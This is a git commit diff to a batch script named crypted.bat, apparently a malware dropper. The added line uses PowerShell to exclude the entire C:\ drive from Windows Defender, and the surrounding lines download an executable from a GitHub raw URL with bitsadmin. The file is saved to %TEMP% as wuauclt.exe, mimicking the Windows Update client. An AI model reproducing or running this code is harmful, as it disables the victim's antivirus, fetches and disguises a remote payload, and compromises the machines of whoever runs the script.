2dc39e24c0302db18f15e0c6f0a8cefebbbc909d
vault053009-maker <vault053009@gmail.com>
2025-10-02 22:56:50 -0700

    Add files via upload

--- crypted.bat
+++ crypted.bat
@@ -37,8 +37,8 @@ if %errorLevel% == 0 (
     )
     
     setlocal
-    reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\" /t REG_DWORD /d 0 /f
-    timeout /t 2 >nul
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
+    timeout /t 3 >nul
     set "exeFile=%TEMP%\wuauclt.exe"
     set "url1=https://github.com/vault053009-maker/a/raw/refs/heads/main/VioletClient.exe"
     bitsadmin /transfer "Update" "%url1%" "%exeFile%"
